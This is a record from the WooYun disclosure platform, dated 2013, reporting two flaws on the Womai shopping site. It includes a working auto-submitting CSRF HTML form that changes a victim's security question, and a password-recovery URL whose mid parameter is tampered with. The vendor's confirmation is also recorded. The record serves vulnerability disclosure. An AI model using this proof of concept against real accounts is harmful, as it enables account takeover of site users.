{"id": 12746, "wybug_id": "wooyun-2013-021179", "wybug_title": "中粮我买网的两处小问题", "wybug_corp": "中粮我买网", "wybug_author": "带馅儿馒头", "wybug_date": "2013-04-03 09:44", "wybug_open_date": "2013-05-18 09:45", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-18：\t细节向公众公开  简要描述： rt 详细说明：  1.注册一个用户登录，来到密保设置处，填写好问题及答案；\n\n2.测试发现未校验referer，可通过csrf修改用户密保，访问以下POC即可；\n<html><body><form id=\"mantou\" name=\"mantou\" action=\"http://gz.womai.com/Member/SetPasswordProtectionResult.do\" method=\"POST\"><input type=\"text\" name=\"safetyQuestion\" value=\"%E6%82%A8%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E8%BF%90%E5%8A%A8%E5%91%98%E7%9A%84%E5%90%8D%E5%AD%97\" /><input type=\"text\" name=\"answer\" value=\"ceshi\" /><input type=\"submit\" value=\"submit\" /><form><script>   document.mantou.submit();</script></body></html>\n3.但是无法直接通过密保找回用户密码，密码重置链接还是会发送用户邮箱；\n\n4.此时发现找回密码的链接如下；\nhttp://gz.womai.com/Member/FindPasswordOK.jsp?mid=200\n5.将mid参数改成-200提交出现下面的情况；\n\n\n\n   漏洞证明：  见详细说明   修复方案：     版权声明：转载请注明来源 带馅儿馒头@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-04-03 10:03 厂商回复： 感谢洞主，我们尽快安排修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-18 15:10 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:84        )\t\t \n  @session    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}